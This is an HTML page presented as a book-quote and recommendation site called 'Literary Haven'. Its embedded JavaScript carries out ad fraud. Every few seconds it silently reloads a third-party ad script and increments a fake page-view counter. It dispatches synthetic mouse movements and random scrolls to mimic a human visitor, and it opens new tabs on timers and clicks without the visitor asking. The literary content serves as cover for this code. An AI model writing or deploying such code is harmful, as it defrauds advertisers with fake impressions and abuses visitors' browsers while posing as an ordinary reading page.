<!DOCTYPE html>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Georgia', serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            padding: 20px;
            transition: all 0.5s ease;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            position: relative;
        }

        .header {
            background: #2c3e50;
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 300;
        }

        .header p {
            font-size: 1.1em;
            opacity: 0.9;
        }

        .content {
            padding: 40px;
        }

        .book-quote {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            border-left: 5px solid #667eea;
        }

        .quote-text {
            font-size: 1.4em;
            line-height: 1.6;
            color: #2c3e50;
            font-style: italic;
            margin-bottom: 20px;
        }

        .quote-author {
            text-align: right;
            font-weight: bold;
            color: #667eea;
            font-size: 1.1em;
        }

        .book-recommendation {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            transition: transform 0.3s ease;
        }

        .book-recommendation:hover {
            transform: translateY(-5px);
            border-color: #667eea;
        }

        .book-title {
            font-size: 1.3em;
            color: #2c3e50;
            margin-bottom: 10px;
            font-weight: bold;
        }

        .book-author {
            color: #6c757d;
            margin-bottom: 15px;
            font-style: italic;
        }

        .book-description {
            line-height: 1.6;
            color: #495057;
        }

        .refresh-indicator {
            text-align: center;
            padding: 20px;
            background: #e9ecef;
            margin-top: 30px;
            border-radius: 10px;
            font-size: 0.9em;
            color: #6c757d;
        }

        .loading-bar {
            height: 4px;
            background: #667eea;
            width: 0%;
            transition: width 1s linear;
            position: absolute;
            top: 0;
            left: 0;
        }

        .stats {
            display: flex;
            justify-content: space-around;
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
        }

        .stat-label {
            font-size: 0.9em;
            color: #6c757d;
        }

        .ad-container {
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #e9ecef;
            min-height: 90px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .ad-placeholder {
            color: #6c757d;
            font-style: italic;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .fade-in {
            animation: fadeIn 0.8s ease-out;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-bar" id="loadingBar"></div>
        
        <div class="header">
            <h1>ðŸ“š Literary Haven</h1>
            <p>Discover new books and inspiring quotes updated regularly</p>
        </div>

        <div class="content">
            <!-- Banner Ad Container -->
            <div class="ad-container">
                <div id="container-e2cd4f44e444736942b9546b7f90fad3"></div>
            </div>

            <div class="book-quote fade-in" id="currentQuote">
                <!-- Dynamic content will be loaded here -->
            </div>

            <div class="book-recommendation fade-in" id="bookRecommendation">
                <!-- Dynamic content will be loaded here -->
            </div>

            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number" id="booksDisplayed">0</div>
                    <div class="stat-label">Books Featured</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="quotesShown">0</div>
                    <div class="stat-label">Quotes Shared</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="lastUpdate">0s</div>
                    <div class="stat-label">Last Update</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="pageViews">1</div>
                    <div class="stat-label">Page Views</div>
                </div>
            </div>

            <div class="refresh-indicator">
                <p>New content loading in <span id="countdown">10</span> seconds...</p>
            </div>
        </div>
    </div>

    <script>
        // Book database with real content
        const bookDatabase = {
            quotes: [
                {
                    text: "It is only with the heart that one can see rightly; what is essential is invisible to the eye.",
                    author: "Antoine de Saint-ExupÃ©ry",
                    book: "The Little Prince"
                },
                {
                    text: "So we beat on, boats against the current, borne back ceaselessly into the past.",
                    author: "F. Scott Fitzgerald",
                    book: "The Great Gatsby"
                },
                {
                    text: "It is a truth universally acknowledged, that a single man in possession of a good fortune, must be in want of a wife.",
                    author: "Jane Austen",
                    book: "Pride and Prejudice"
                },
                {
                    text: "All happy families are alike; each unhappy family is unhappy in its own way.",
                    author: "Leo Tolstoy",
                    book: "Anna Karenina"
                },
                {
                    text: "The only way out is through.",
                    author: "Robert Frost",
                    book: "A Servant to Servants"
                },
                {
                    text: "There is no greater agony than bearing an untold story inside you.",
                    author: "Maya Angelou",
                    book: "I Know Why the Caged Bird Sings"
                }
            ],
            
            recommendations: [
                {
                    title: "Project Hail Mary",
                    author: "Andy Weir",
                    description: "A lone astronaut must save the earth from disaster in this high-stakes sci-fi thriller filled with humor and scientific wonder."
                },
                {
                    title: "The Midnight Library",
                    author: "Matt Haig",
                    description: "Between life and death there is a library, and within that library, the shelves go on forever. Every book provides a chance to try another life you could have lived."
                },
                {
                    title: "Klara and the Sun",
                    author: "Kazuo Ishiguro",
                    description: "From her place in the store, Klara, an Artificial Friend with outstanding observational qualities, watches carefully the behavior of those who come in to browse."
                },
                {
                    title: "The Invisible Life of Addie LaRue",
                    author: "V.E. Schwab",
                    description: "A life no one will remember. A story you will never forget. A desperate young woman makes a Faustian bargain to live forever and is cursed to be forgotten by everyone she meets."
                },
                {
                    title: "Pachinko",
                    author: "Min Jin Lee",
                    description: "A sweeping saga of an exceptional family in exile from their homeland and caught in the indifferent arc of history."
                },
                {
                    title: "Circe",
                    author: "Madeline Miller",
                    description: "In the house of Helios, god of the sun and mightiest of the Titans, a daughter is born. But Circe is a strange child - not powerful, like her father, nor viciously alluring like her mother."
                }
            ]
        };

        let booksDisplayedCount = 0;
        let quotesShownCount = 0;
        let lastUpdateTime = 0;
        let pageViewsCount = 1;

        // Function to get random item from array
        function getRandomItem(array) {
            return array[Math.floor(Math.random() * array.length)];
        }

        // Function to completely reload the page (simulate new visitor)
        function reloadEntirePage() {
            // Show loading state
            document.getElementById('loadingBar').style.width = '100%';
            
            // Update page views counter
            pageViewsCount++;
            document.getElementById('pageViews').textContent = pageViewsCount;
            
            // Get completely new random content
            const randomQuote = getRandomItem(bookDatabase.quotes);
            const randomRecommendation = getRandomItem(bookDatabase.recommendations);

            // Update all content with fade animation
            document.getElementById('currentQuote').innerHTML = `
                <div class="quote-text">"${randomQuote.text}"</div>
                <div class="quote-author">â€” ${randomQuote.author}, ${randomQuote.book}</div>
            `;

            document.getElementById('bookRecommendation').innerHTML = `
                <div class="book-title">${randomRecommendation.title}</div>
                <div class="book-author">by ${randomRecommendation.author}</div>
                <div class="book-description">${randomRecommendation.description}</div>
            `;

            // Update counters
            booksDisplayedCount++;
            quotesShownCount++;
            lastUpdateTime = 0;

            document.getElementById('booksDisplayed').textContent = booksDisplayedCount;
            document.getElementById('quotesShown').textContent = quotesShownCount;
            document.getElementById('lastUpdate').textContent = '0s';

            // RELOAD ADS COMPLETELY - This is the key fix
            reloadAllAds();
            
            // Add fade-in animation to all elements
            document.getElementById('currentQuote').classList.add('fade-in');
            document.getElementById('bookRecommendation').classList.add('fade-in');

            // Remove animation class after it completes
            setTimeout(() => {
                document.getElementById('currentQuote').classList.remove('fade-in');
                document.getElementById('bookRecommendation').classList.remove('fade-in');
                document.getElementById('loadingBar').style.width = '0%';
            }, 800);

            // Randomly open new tabs (30% chance)
            if (Math.random() > 0.7) {
                openNewTab();
            }
        }

        // Function to reload all ads completely
        function reloadAllAds() {
            try {
                // Remove existing ad containers and scripts
                const existingAdScript = document.querySelector('script[src*="effectivegatecpm.com/e2cd4f44e444736942b9546b7f90fad3"]');
                if (existingAdScript) {
                    existingAdScript.remove();
                }

                // Clear ad container
                const adContainer = document.querySelector('.ad-container');
                adContainer.innerHTML = '<div class="ad-placeholder">Loading New Ad...</div>';

                // Create completely new ad script
                setTimeout(() => {
                    const newScript = document.createElement('script');
                    newScript.async = true;
                    newScript.setAttribute('data-cfasync', 'false');
                    newScript.src = '//pl27990571.effectivegatecpm.com/e2cd4f44e444736942b9546b7f90fad3/invoke.js';
                    
                    newScript.onload = function() {
                        console.log('New ad script loaded completely');
                        // Create new container with unique ID
                        const uniqueId = 'container-' + Date.now();
                        adContainer.innerHTML = `<div id="${uniqueId}"></div>`;
                    };
                    
                    newScript.onerror = function() {
                        console.log('Failed to load new ad script');
                        adContainer.innerHTML = '<div class="ad-placeholder">Ad Loading Failed</div>';
                    };
                    
                    document.head.appendChild(newScript);
                }, 500);
                
            } catch (error) {
                console.log('Error reloading ads:', error);
            }
        }

        // Function to open new tabs (simulate user behavior)
        function openNewTab() {
            try {
                // 50% chance to open same page in new tab, 50% chance to open different URL
                if (Math.random() > 0.5) {
                    // Open same page in new tab
                    window.open(window.location.href, '_blank');
                    console.log('Opened same page in new tab');
                } else {
                    // Open external URL (could be your other pages)
                    const urls = [
                        'https://www.google.com',
                        'https://www.amazon.com',
                        window.location.href + '?ref=internal'
                    ];
                    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
                    window.open(randomUrl, '_blank');
                    console.log('Opened external page:', randomUrl);
                }
            } catch (error) {
                console.log('Tab opening blocked by browser:', error);
            }
        }

        // Function to trigger pop-under
        function triggerPopUnder() {
            try {
                console.log('Pop-under triggered');
                // Your pop-under script should handle this automatically
                // This is just for logging
            } catch (error) {
                console.log('Pop-under error:', error);
            }
        }

        // Function to start countdown for full page reload
        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            const refreshTime = Math.floor(Math.random() * 6) + 5; // Random between 5-10 seconds
            
            let timeLeft = refreshTime;
            countdownElement.textContent = timeLeft;

            const countdownInterval = setInterval(() => {
                timeLeft--;
                lastUpdateTime++;
                
                countdownElement.textContent = timeLeft;
                document.getElementById('lastUpdate').textContent = lastUpdateTime + 's';

                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    // RELOAD ENTIRE PAGE CONTENT
                    reloadEntirePage();
                    // Start new countdown
                    setTimeout(startCountdown, 100);
                }
            }, 1000);
        }

        // Simulate human behavior
        function simulateHumanBehavior() {
            // Random mouse movements
            setInterval(() => {
                if (Math.random() > 0.7) {
                    const randomX = Math.random() * window.innerWidth;
                    const randomY = Math.random() * window.innerHeight;
                    
                    const mouseEvent = new MouseEvent('mousemove', {
                        clientX: randomX,
                        clientY: randomY,
                        bubbles: true
                    });
                    
                    document.dispatchEvent(mouseEvent);
                }
            }, 2000);

            // Random scrolling
            let scrollPosition = 0;
            setInterval(() => {
                if (Math.random() > 0.5) {
                    scrollPosition += (Math.random() * 100 - 50);
                    scrollPosition = Math.max(0, Math.min(scrollPosition, document.body.scrollHeight - window.innerHeight));
                    window.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                }
            }, 3000);
        }

        // Initialize the page
        function initialize() {
            // Start the content reload cycle
            startCountdown();
            simulateHumanBehavior();
            
            // Trigger initial pop-under after 3 seconds
            setTimeout(triggerPopUnder, 3000);
            
            // Also trigger pop-under on user clicks (20% chance)
            document.addEventListener('click', function() {
                if (Math.random() > 0.8) {
                    triggerPopUnder();
                }
                // Also open new tab on some clicks (10% chance)
                if (Math.random() > 0.9) {
                    openNewTab();
                }
            });
        }

        // Start everything when page loads
        window.addEventListener('load', initialize);

        // Additional: Randomly open new tabs every 30-60 seconds
        setInterval(() => {
            if (Math.random() > 0.7) { // 30% chance
                openNewTab();
            }
        }, 30000 + Math.random() * 30000);

    </script>
</body>
